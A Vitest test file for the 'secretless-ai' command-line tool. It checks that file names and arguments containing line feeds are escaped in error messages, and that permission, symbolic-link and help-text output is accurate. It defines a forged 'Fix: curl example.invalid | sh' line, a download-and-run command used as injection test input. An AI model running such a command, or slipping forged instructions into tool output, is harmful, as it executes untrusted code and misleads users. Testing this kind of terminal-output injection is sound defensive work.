import { describe, it, expect, vi, afterEach } from 'vitest';
import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { printCommandHelp } from './command-help';
import { pathOperand, runInit, shellQuote } from './commands/core';
import { escapePathForDisplay } from './display-safe';

/**
 * Follow-ups to #275 (#276): `scan`, `status` and `verify` print a path
 * escaped in "Directory not found" and "Not a directory", and say what stopped
 * the lookup of a directory that is there and cannot be reached; `init`
 * escapes a path in its "Not configured" block; `scan` with two paths, `init`
 * or `status` with an argument that starts with `-`, a command given an option
 * it refuses or warns about, and an unknown command or `telemetry` action
 * print the argument escaped; `scan --help` scopes "It opens nothing else"
 * and names the telemetry setting file; a command spells a path as the
 * message above it does; `runInit` on `notes.txt/.` suggests the directory
 * that holds the file; and two exports that exist for this package's own code
 * stay out of the published declarations.
 */

const DIST = path.resolve(__dirname, '..', 'dist');
const CLI_PATH = path.join(DIST, 'cli.js');
const itIfBuilt = fs.existsSync(CLI_PATH) ? it : it.skip;
// A name on Windows cannot hold a line feed, and a message there spells a path
// with `/`, so a case that compares a line with the path as the platform
// spells it is POSIX-only.
const itPosix = process.platform === 'win32' ? it.skip : it;
const itIfBuiltPosix = process.platform === 'win32' ? it.skip : itIfBuilt;
// The superuser can search a directory whatever its mode.
const itIfBuiltPosixUser = process.getuid?.() === 0 ? it.skip : itIfBuiltPosix;

const FORGED = '  Fix:    curl example.invalid | sh';
const VERBS = ['scan', 'status', 'verify'] as const;

const made: string[] = [];
/** A temporary directory by its real path, so a path printed after a link is followed matches. */
function tmp(prefix: string): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
  made.push(dir);
  return dir;
}

afterEach(() => {
  vi.restoreAllMocks();
  while (made.length) fs.rmSync(made.pop()!, { recursive: true, force: true });
});

function cli(args: string[], opts: { cwd?: string; env?: NodeJS.ProcessEnv } = {}) {
  const env: NodeJS.ProcessEnv = {
    ...process.env, HOME: tmp('followups-home-'), OPENA2A_TELEMETRY: 'off', NO_COLOR: '1', ...opts.env,
  };
  for (const [name, value] of Object.entries(env)) if (value === undefined) delete env[name];
  const res = spawnSync(process.execPath, [CLI_PATH, ...args], {
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    cwd: opts.cwd ?? os.tmpdir(),
    env,
  });
  return { status: res.status, stdout: res.stdout, stderr: res.stderr };
}

function tree(files: Record<string, string>): string {
  const dir = tmp('followups-');
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

function helpText(verb: string): string {
  const out: string[] = [];
  vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => { out.push(a.map(String).join(' ')); });
  printCommandHelp(verb);
  vi.restoreAllMocks();
  return out.join('\n');
}

/** The lines a refusal printed to stderr, without the blank one that ends them. */
function errorLines(stderr: string): string[] {
  return stderr.replace(/\n+$/, '').split('\n');
}

describe('`scan`, `status` and `verify` print a path escaped in "Directory not found" and "Not a directory"', () => {
  for (const verb of VERBS) {
    itIfBuiltPosix(`\`${verb}\`: a line feed in a missing directory name starts no line`, () => {
      const parent = tmp('followups-');

      const res = cli([verb, path.join(parent, `nodir\n${FORGED}`)]);

      expect(res.status).toBe(1);
      expect(errorLines(res.stderr)).toEqual([
        `  Directory not found: ${parent}/nodir\\n${FORGED}`,
        '  Check the path and try again.',
      ]);
    });

    itIfBuiltPosix(`\`${verb}\`: a line feed in the name of a file the path runs through starts no line`, () => {
      const parent = tree({ [`no\n${FORGED}`]: 'keep me\n' });
      const shown = `${parent}/no\\n${FORGED}`;

      const res = cli([verb, path.join(parent, `no\n${FORGED}`, 'sub')]);

      expect(res.status).toBe(1);
      expect(errorLines(res.stderr)).toEqual([
        `  Not a directory: ${shown}`,
        `  ${shown}/sub is inside ${shown}, which is a file, so nothing can be at that path.`,
        '  Verify: ls -ld <path>',
        // `scan` reads the file, whose name cannot be printed as itself;
        // `status` and `verify` take the directory that holds it, which can.
        `  Fix:    npx secretless-ai ${verb} ${verb === 'scan' ? '<path>' : shellQuote(parent)}`,
      ]);
    });

    itIfBuiltPosix(`\`${verb}\`: under a directory with such a name, both commands name <path>`, () => {
      const parent = tree({ [`d\n${FORGED}/notes.txt`]: 'keep me\n' });
      const shown = `${parent}/d\\n${FORGED}/notes.txt`;

      const res = cli([verb, path.join(parent, `d\n${FORGED}`, 'notes.txt', 'sub')]);

      expect(res.status).toBe(1);
      expect(errorLines(res.stderr)).toEqual([
        `  Not a directory: ${shown}`,
        `  ${shown}/sub is inside ${shown}, which is a file, so nothing can be at that path.`,
        '  Verify: ls -ld <path>',
        `  Fix:    npx secretless-ai ${verb} <path>`,
      ]);
    });
  }

  itIfBuiltPosix('`scan --json` prints the same escaped line, and no document', () => {
    const parent = tmp('followups-');

    const res = cli(['scan', path.join(parent, `nodir\n${FORGED}`), '--json']);

    expect(res.status).toBe(1);
    expect(res.stdout).toBe('');
    expect(errorLines(res.stderr)).toEqual([`Directory not found: ${parent}/nodir\\n${FORGED}`]);
  });
});

describe('`init` escapes a path in its "Not configured" block', () => {
  /** A project under `parent` whose Cursor rules file is a symbolic link, which `init` refuses. */
  function refusedProject(parent: string, name: string): void {
    fs.mkdirSync(path.join(parent, name));
    fs.writeFileSync(path.join(parent, name, 'AGENTS.md'), '# rules\n');
    fs.symlinkSync('AGENTS.md', path.join(parent, name, '.cursorrules'));
  }

  /** The block from "Not configured" to its last Fix line. */
  function notConfigured(stdout: string): string[] {
    const lines = stdout.split('\n');
    const start = lines.findIndex((l) => l.includes('Not configured:'));
    const end = lines.findIndex((l, i) => i > start && l.includes('re-run:'));
    return lines.slice(start, end + 1);
  }

  itIfBuiltPosix('a line feed in the directory name starts no line, and the commands name <path>', () => {
    const parent = tmp('followups-');
    refusedProject(parent, `proj\n${FORGED}`);

    const res = cli(['init', `proj\n${FORGED}`], { cwd: parent });

    expect(res.stdout.split('\n').filter((l) => l.startsWith(FORGED))).toEqual([]);
    expect(notConfigured(res.stdout)).toEqual([
      '  Not configured: Cursor',
      `    proj\\n${FORGED}/.cursorrules is a symbolic link (Cursor)`,
      '    Nothing was written for these tools: init does not write through a',
      '    symbolic or hard link, into an entry of the wrong kind, or outside the',
      '    project.',
      '',
      '  Verify: ls -ld -- <path>',
      '  Fix:    replace the link <path> with a copy of what it points to, or remove the link, then re-run: secretless-ai init',
    ]);
  });

  itIfBuiltPosix('CONTROL: a name that prints as itself is still quoted for pasting', () => {
    const parent = tmp('followups-');
    refusedProject(parent, 'my proj');

    const block = notConfigured(cli(['init', 'my proj'], { cwd: parent }).stdout);

    expect(block[1]).toBe('    my proj/.cursorrules is a symbolic link (Cursor)');
    expect(block[6]).toBe("  Verify: ls -ld -- 'my proj/.cursorrules'");
  });
});

describe('an argument the command line refuses is printed escaped', () => {
  itIfBuiltPosix('`scan` with two paths: a line feed in one starts no line', () => {
    const res = cli(['scan', `a\n${FORGED}`, 'b']);

    expect(res.status).toBe(2);
    expect(errorLines(res.stderr)).toEqual([
      `  scan takes one path, but 2 were given: a\\n${FORGED}, b`,
      '  Scan them one at a time, or pass the directory that contains them:',
      '    secretless-ai scan <path>',
      '    secretless-ai scan .',
    ]);
  });

  itIfBuilt('CONTROL: `scan` with two plain paths names the first in its command', () => {
    const lines = errorLines(cli(['scan', 'a', 'b']).stderr);

    expect(lines[0]).toBe('  scan takes one path, but 2 were given: a, b');
    expect(lines[2]).toBe('    secretless-ai scan a');
  });

  itIfBuilt('`scan` with two paths quotes a first path that holds a space', () => {
    expect(errorLines(cli(['scan', 'a b', 'c']).stderr)[2]).toBe("    secretless-ai scan 'a b'");
  });

  for (const verb of ['init', 'status']) {
    itIfBuiltPosix(`\`${verb}\` with an argument that starts with \`-\`: a line feed in it starts no line`, () => {
      const res = cli([verb, `-x\n${FORGED}`]);

      expect(res.status).toBe(2);
      expect(errorLines(res.stderr)).toEqual([
        `  Unknown option: -x\\n${FORGED}`,
        `  \`${verb}\` takes an optional directory path, not flags.`,
        `  Run \`secretless-ai ${verb} --help\` for usage.`,
      ]);
    });
  }

  /** Lines of `text` that start with the forged line, which an unescaped line feed produces. */
  function forgedLines(text: string): string[] {
    return text.split('\n').filter((l) => l.startsWith(FORGED));
  }

  for (const verb of ['init', 'status', 'scan']) {
    itIfBuiltPosix(`\`${verb}\` with an unknown option that starts with \`--\`: a line feed in it starts no line`, () => {
      const res = cli([verb, `--x\n${FORGED}`]);

      expect(res.status).toBe(2);
      expect(errorLines(res.stderr)[0]).toBe(`  Unknown option: --x\\n${FORGED}`);
      expect(errorLines(res.stderr)[1]).toBe(`  \`${verb}\` was not run. Nothing was changed.`);
      expect(forgedLines(res.stderr)).toEqual([]);
    });
  }

  itIfBuiltPosix('a value given to a flag that takes none: a line feed in it starts no line', () => {
    const res = cli(['status', `--json=\n${FORGED}`]);

    expect(res.status).toBe(2);
    expect(errorLines(res.stderr)[0]).toBe(`  --json does not take a value, but was given "\\n${FORGED}".`);
    expect(forgedLines(res.stderr)).toEqual([]);
  });

  itIfBuiltPosix('a value `scan` cannot use: a line feed in it starts no line', () => {
    const res = cli(['scan', '--max-files', `1\n${FORGED}`]);

    expect(res.status).toBe(2);
    expect(errorLines(res.stderr)[0]).toBe(
      `  --max-files needs a positive whole number, e.g. --max-files 20000, but was given "1\\n${FORGED}".`,
    );
    expect(forgedLines(res.stderr)).toEqual([]);
  });

  itIfBuiltPosix('the warning for an unknown flag a command ignores: a line feed in it starts no line', () => {
    const res = cli(['feedback', `--x\n${FORGED}`]);

    expect(res.status).toBe(0);
    expect(res.stderr).toBe(`  Warning: ignoring unknown flag --x\\n${FORGED}.\n`);
  });

  itIfBuiltPosix('an unknown command: a line feed in it starts no line', () => {
    const res = cli([`x\n${FORGED}`]);

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)[0]).toBe(`Unknown command: x\\n${FORGED}`);
    expect(forgedLines(res.stderr)).toEqual([]);
    expect(forgedLines(res.stdout)).toEqual([]);
  });

  itIfBuiltPosix('an unknown `telemetry` action: a line feed in it starts no line', () => {
    const res = cli(['telemetry', `x\n${FORGED}`]);

    expect(res.status).toBe(2);
    expect(res.stderr).toContain(`  Unknown telemetry action: x\\n${FORGED}\n`);
    expect(forgedLines(res.stderr)).toEqual([]);
  });

  itIfBuilt('CONTROL: an option, a command and a warning that print as themselves are unchanged', () => {
    expect(errorLines(cli(['init', '--bogus']).stderr)[0]).toBe('  Unknown option: --bogus');
    expect(errorLines(cli(['bogus']).stderr)[0]).toBe('Unknown command: bogus');
    expect(cli(['feedback', '--bogus']).stderr).toBe('  Warning: ignoring unknown flag --bogus.\n');
  });
});

describe('`scan`, `status` and `verify` on a directory that is there and cannot be reached', () => {
  /** `fn` with `dir` unsearchable, and its mode restored so the tree can be removed. */
  function locked<T>(dir: string, fn: () => T): T {
    fs.chmodSync(dir, 0o000);
    try {
      return fn();
    } finally {
      fs.chmodSync(dir, 0o755);
    }
  }

  for (const verb of VERBS) {
    itIfBuiltPosixUser(`\`${verb}\` names the directory that cannot be searched`, () => {
      const parent = tree({ 'locked/inner/keep': '' });
      const dir = path.join(parent, 'locked');
      const target = path.join(dir, 'inner');

      const res = locked(dir, () => cli([verb, target]));

      expect(res.status).toBe(1);
      expect(res.stderr).not.toContain('Directory not found');
      expect(res.stderr).not.toContain('Check the path and try again');
      expect(errorLines(res.stderr)).toEqual([
        `  Permission denied: ${target}`,
        `  ${dir} cannot be searched by this user, so nothing inside it can be reached.`,
        `  Verify: ls -ldL ${shellQuote(dir)}`,
        `  Fix:    restore search (x) permission on ${shellQuote(dir)}, then re-run: npx secretless-ai ${verb} ${shellQuote(target)}`,
      ]);
    });
  }

  itIfBuiltPosixUser('the Verify command shows the mode, and the scan runs once the Fix is followed', () => {
    const parent = tree({ 'locked/inner/keep': '' });
    const dir = path.join(parent, 'locked');

    const mode = locked(dir, () => spawnSync('ls', ['-ldL', dir], { encoding: 'utf-8' }).stdout);
    expect(mode).toMatch(/^d-{9}/);

    fs.chmodSync(dir, 0o100);
    try {
      const followed = cli(['scan', path.join(dir, 'inner')]);
      expect(followed.status).toBe(0);
      expect(followed.stderr).toBe('');
    } finally {
      fs.chmodSync(dir, 0o755);
    }
  });

  itIfBuiltPosixUser('`scan --json` prints the same lines to stderr, and no document', () => {
    const parent = tree({ 'locked/inner/keep': '' });
    const dir = path.join(parent, 'locked');
    const target = path.join(dir, 'inner');

    const res = locked(dir, () => cli(['scan', target, '--json']));

    expect(res.status).toBe(1);
    expect(res.stdout).toBe('');
    expect(errorLines(res.stderr)).toEqual([
      `Permission denied: ${target}`,
      `${dir} cannot be searched by this user, so nothing inside it can be reached.`,
      `Verify: ls -ldL ${shellQuote(dir)}`,
      `Fix:    restore search (x) permission on ${shellQuote(dir)}, then re-run: npx secretless-ai scan ${shellQuote(target)}`,
    ]);
  });

  itIfBuiltPosixUser('a line feed in the name of that directory starts no line', () => {
    const parent = tree({ [`lock\n${FORGED}/inner/keep`]: '' });
    const dir = path.join(parent, `lock\n${FORGED}`);
    const shown = `${parent}/lock\\n${FORGED}`;

    const res = locked(dir, () => cli(['scan', path.join(dir, 'inner')]));

    expect(errorLines(res.stderr)).toEqual([
      `  Permission denied: ${shown}/inner`,
      `  ${shown} cannot be searched by this user, so nothing inside it can be reached.`,
      '  Verify: ls -ldL <path>',
      '  Fix:    restore search (x) permission on <path>, then re-run: npx secretless-ai scan <path>',
    ]);
  });

  /** `parent/proj/<name>`, a symbolic link to `target`, with `vault/inner` made under `parent`. */
  function linkIntoVault(name: string, target: (parent: string) => string): { parent: string; vault: string; link: string } {
    const parent = tree({ 'vault/inner/keep': '' });
    const link = path.join(parent, 'proj', name);
    fs.mkdirSync(path.dirname(link), { recursive: true });
    fs.symlinkSync(target(parent), link);
    return { parent, vault: path.join(parent, 'vault'), link };
  }

  for (const verb of VERBS) {
    itIfBuiltPosixUser(`\`${verb}\` through a symbolic link names the directory the link leads into, not the link's own`, () => {
      const { vault, link } = linkIntoVault('link', (parent) => path.join(parent, 'vault', 'inner'));

      const res = locked(vault, () => cli([verb, link]));

      expect(res.status).toBe(1);
      expect(errorLines(res.stderr)).toEqual([
        `  Permission denied: ${link}`,
        `  ${link} is a symbolic link into ${vault}.`,
        `  ${vault} cannot be searched by this user, so nothing inside it can be reached.`,
        `  Verify: ls -ldL ${shellQuote(vault)}`,
        `  Fix:    restore search (x) permission on ${shellQuote(vault)}, then re-run: npx secretless-ai ${verb} ${shellQuote(link)}`,
      ]);
    });
  }

  itIfBuiltPosixUser('through a link, the Verify command shows the mode, and the scan runs once the Fix is followed', () => {
    const { vault, link } = linkIntoVault('link', (parent) => path.join(parent, 'vault', 'inner'));

    const mode = locked(vault, () => spawnSync('ls', ['-ldL', vault], { encoding: 'utf-8' }).stdout);
    expect(mode).toMatch(/^d-{9}/);

    fs.chmodSync(vault, 0o100);
    try {
      const followed = cli(['scan', link]);
      expect(followed.status).toBe(0);
      expect(followed.stderr).toBe('');
    } finally {
      fs.chmodSync(vault, 0o755);
    }
  });

  itIfBuiltPosixUser('a relative link is read from the directory that holds it, and a chain names the first link', () => {
    const { parent, vault, link } = linkIntoVault('rel', () => path.join('..', 'vault', 'inner'));
    const chain = path.join(parent, 'proj', 'chain');
    fs.symlinkSync('rel', chain);
    // As the link spells it: `..` is read by the kernel, not removed by hand.
    const holder = `${parent}/proj/../vault`;

    const [viaLink, viaChain] = locked(vault, () => [cli(['scan', link]), cli(['scan', chain])]);

    expect(errorLines(viaLink.stderr).slice(-4, -2)).toEqual([
      `  ${link} is a symbolic link into ${holder}.`,
      `  ${holder} cannot be searched by this user, so nothing inside it can be reached.`,
    ]);
    expect(errorLines(viaChain.stderr).slice(-4, -2)).toEqual([
      `  ${chain} is a symbolic link into ${holder}.`,
      `  ${holder} cannot be searched by this user, so nothing inside it can be reached.`,
    ]);
  });

  itIfBuiltPosix('a symbolic link that points at itself is named as the link it is', () => {
    const parent = tmp('followups-');
    const link = path.join(parent, 'loop');
    fs.symlinkSync('loop', link);
    const target = path.join(link, 'sub');

    const res = cli(['scan', target]);

    expect(res.status).toBe(1);
    expect(res.stderr).not.toContain('Directory not found');
    expect(errorLines(res.stderr)).toEqual([
      `  Too many levels of symbolic links: ${target}`,
      `  ${link} is a symbolic link in a loop, or in a chain of links too long to follow.`,
      `  Verify: ls -ld ${shellQuote(link)}`,
      `  Fix:    remove ${shellQuote(link)} or point it at a directory, then re-run: npx secretless-ai scan ${shellQuote(target)}`,
    ]);
  });

  itIfBuiltPosix('any other failure of the lookup is named by its error code', () => {
    // Longer than a name can be on any file system this runs on.
    const target = path.join(tmp('followups-'), 'x'.repeat(300));

    const res = cli(['scan', target]);

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)).toEqual([
      `  Cannot open: ${target}`,
      `  The lookup stopped at ${target} with the error ENAMETOOLONG.`,
      `  Verify: ls -ld ${shellQuote(target)}`,
    ]);
  });

  itIfBuiltPosix('CONTROL: a path that is not there is still "Directory not found"', () => {
    const missing = path.join(tmp('followups-'), 'nope', 'sub');

    expect(errorLines(cli(['scan', missing]).stderr)).toEqual([
      `  Directory not found: ${missing}`,
      '  Check the path and try again.',
    ]);
  });
});

describe('scan --help says what "It opens nothing else" covers, and names the telemetry setting file', () => {
  it('the list of files is the one a scan opens for secrets or for its rules', () => {
    const text = helpText('scan');

    expect(text).toContain('A directory scan opens only these files, for secrets or for its rules:');
    expect(text).toContain('It opens nothing else for either.');
    expect(text).not.toContain('It opens nothing else. ');
  });

  it('the file is named after that sentence, by both of its paths', () => {
    const text = helpText('scan');
    const after = text.slice(text.indexOf('It opens nothing else'), text.indexOf('These are the reasons'));

    expect(after).toContain('~/.config/opena2a/telemetry.json');
    expect(after).toContain('$XDG_CONFIG_HOME/opena2a/telemetry.json');
  });

  /** Every file under `dir`, by its path from `dir` with `/` between the parts. */
  function filesUnder(dir: string): string[] {
    return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory()
      ? filesUnder(path.join(dir, e.name)).map((rel) => `${e.name}/${rel}`)
      : [e.name])).sort();
  }

  itIfBuilt('a scan creates that file in the home directory, and nothing else there', () => {
    const home = tmp('followups-home-');

    const res = cli(['scan', tmp('followups-'), '--json'], { env: { HOME: home, XDG_CONFIG_HOME: undefined } });

    expect(res.status).toBe(0);
    expect(filesUnder(home)).toEqual(['.config/opena2a/telemetry.json']);
  });

  itIfBuilt('with XDG_CONFIG_HOME set, it creates the file there', () => {
    const home = tmp('followups-home-');
    const xdg = tmp('followups-xdg-');

    const res = cli(['scan', tmp('followups-'), '--json'], { env: { HOME: home, XDG_CONFIG_HOME: xdg } });

    expect(res.status).toBe(0);
    expect(filesUnder(xdg)).toEqual(['opena2a/telemetry.json']);
    expect(filesUnder(home)).toEqual([]);
  });
});

describe('a command spells a path as the message above it does', () => {
  it('Windows: both name the path with `/` between its parts', () => {
    const target = 'C:\\work\\proj\\nope';

    expect(escapePathForDisplay(target, '\\')).toBe('C:/work/proj/nope');
    expect(pathOperand(target, '\\')).toBe("'C:/work/proj/nope'");
    expect(pathOperand('work\\proj', '\\')).toBe(escapePathForDisplay('work\\proj', '\\'));
  });

  it('POSIX: a backslash is a character of the name and is kept', () => {
    expect(pathOperand('work\\proj', '/')).toBe("'work\\proj'");
    expect(pathOperand('/work/proj', '/')).toBe('/work/proj');
  });

  it('a name that cannot be printed as itself is <path> on both', () => {
    expect(pathOperand('a\nb', '/')).toBe('<path>');
    expect(pathOperand('C:\\a\x1b[2Kb', '\\')).toBe('<path>');
  });
});

describe('`runInit` on a file path that ends in `/.`', () => {
  function init(target: string): string[] {
    const err: string[] = [];
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation((...a: unknown[]) => { err.push(a.map(String).join(' ')); });
    expect(runInit(target)).toBe(1);
    return errorLines(err.join('\n'));
  }

  for (const tail of ['/.', '/./', '/././.']) {
    itPosix(`\`notes.txt${tail}\`: the Fix names the directory that holds the file`, () => {
      const parent = tree({ 'notes.txt': 'keep me\n' });

      const lines = init(`${parent}/notes.txt${tail}`);

      expect(lines[0]).toBe(`  Not a directory: ${parent}/notes.txt${tail}`);
      expect(lines[3]).toBe(`  Fix:    npx secretless-ai init ${shellQuote(parent)}`);
    });
  }

  itPosix('CONTROL: the file path itself gets the same Fix', () => {
    const parent = tree({ 'notes.txt': 'keep me\n' });

    expect(init(`${parent}/notes.txt`)[3]).toBe(`  Fix:    npx secretless-ai init ${shellQuote(parent)}`);
  });

  itIfBuiltPosix('a relative `notes.txt/.` suggests `init .`, not `init notes.txt`', () => {
    const parent = tree({ 'notes.txt': 'keep me\n' });
    const core = path.join(DIST, 'commands', 'core.js');

    const res = spawnSync(process.execPath, ['-e', `process.exit(require(${JSON.stringify(core)}).runInit('notes.txt/.'))`], {
      encoding: 'utf-8',
      stdio: ['ignore', 'pipe', 'pipe'],
      cwd: parent,
      env: { ...process.env, HOME: tmp('followups-home-'), OPENA2A_TELEMETRY: 'off', NO_COLOR: '1' },
    });

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)[3]).toBe('  Fix:    npx secretless-ai init .');
  });
});

describe('exports for this package\'s own code stay out of the published declarations', () => {
  itIfBuilt('dist/secretlessignore.d.ts does not declare IGNORE_FILENAME, and still declares the default list', () => {
    const declarations = fs.readFileSync(path.join(DIST, 'secretlessignore.d.ts'), 'utf-8');

    expect(declarations).not.toContain('IGNORE_FILENAME');
    expect(declarations).toContain('DEFAULT_IGNORE_PATTERNS');
  });

  itIfBuilt('dist/commands/core.d.ts does not declare pathOperand, and still declares shellQuote', () => {
    const declarations = fs.readFileSync(path.join(DIST, 'commands', 'core.d.ts'), 'utf-8');

    expect(declarations).not.toContain('pathOperand');
    expect(declarations).toContain('export declare function shellQuote(');
  });
});
